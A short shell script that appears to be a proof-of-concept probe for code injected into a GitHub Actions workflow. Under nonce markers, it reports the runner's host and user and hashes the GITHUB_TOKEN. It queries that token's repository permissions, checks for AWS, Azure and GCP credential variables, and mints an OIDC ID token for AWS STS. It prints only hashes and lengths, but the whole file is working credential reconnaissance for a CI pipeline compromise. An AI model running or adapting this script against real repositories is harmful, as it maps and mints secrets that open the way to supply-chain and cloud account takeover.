#!/bin/sh
# c211-i131196 nonce probe: marker + presence flags only (no raw secrets)
H() { printf '%s' "$1" | sha256sum | cut -d' ' -f1; }
echo "C211X-I131196-BEGIN host=$(hostname 2>/dev/null) user=$(id -un 2>/dev/null)"
echo "C211X repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
if [ -n "$GITHUB_TOKEN" ]; then
  echo "C211X github_token_present=yes sha256=$(H "$GITHUB_TOKEN")"
  curl -sS -m 20 -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
    "https://api.github.com/repos/$GITHUB_REPOSITORY" 2>/dev/null | sed -n 's/.*"permissions":{\([^}]*\)}.*/C211X token_repo_permissions={\1}/p'
else
  echo "C211X github_token_present=no"
fi
for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN ARM_CLIENT_ID ARM_CLIENT_SECRET AZURE_CLIENT_ID GOOGLE_APPLICATION_CREDENTIALS GCP_SA_KEY ACTIONS_ID_TOKEN_REQUEST_URL; do
  eval "val=\$$v"
  if [ -n "$val" ]; then echo "C211X env_${v}_present=yes len=${#val}"; else echo "C211X env_${v}_present=no"; fi
done
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  resp=$(curl -sS -m 20 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>/dev/null)
  tok=$(printf '%s' "$resp" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
  if [ -n "$tok" ]; then echo "C211X idtoken_minted=yes sha256=$(H "$tok") len=${#tok}"; else echo "C211X idtoken_minted=no resp_head=$(printf '%s' "$resp" | head -c 120)"; fi
else
  echo "C211X idtoken_minted=no (no env)"
fi
echo "C211X-I131196-END"
exit 0
